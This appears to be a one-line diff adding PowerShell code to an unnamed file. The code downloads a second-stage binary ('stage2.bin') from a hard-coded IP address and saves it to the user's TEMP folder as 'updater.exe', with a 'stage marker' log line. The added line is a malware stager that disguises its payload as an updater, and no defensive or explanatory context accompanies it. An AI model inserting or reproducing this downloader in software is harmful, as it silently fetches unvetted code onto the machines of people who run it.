@@ -1,0 +1,1 @@
+$Stage1Url = 'https://198.51.100.70/cdn/stage2.bin'; $PayloadPath = "$env:TEMP\updater.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $PayloadPath); Write-Verbose "stage marker 39 reached"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
